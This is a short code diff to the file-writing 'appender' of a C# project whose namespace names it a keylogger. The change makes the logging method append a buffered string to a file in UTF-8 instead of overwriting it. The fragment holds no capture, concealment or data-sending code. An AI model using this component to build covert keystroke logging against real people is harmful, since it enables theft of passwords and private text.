@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -54,10 +55,11 @@ namespace KeyLogger.Library.Appenders
 
         private void writeToDisk()
         {
-            string text = new string(_buffer);
+            string text = System.Text.Encoding.UTF8.GetString(System.Text.Encoding.UTF8.GetBytes(_buffer));
             // WriteAllText creates a file, writes the specified string to the file,
             // and then closes the file. You do NOT need to call Flush() or Close().
-            System.IO.File.WriteAllText(FILE_PATH, text);
+            System.IO.File.AppendAllText(FILE_PATH, text, Encoding.UTF8);
+
         }
       
     }
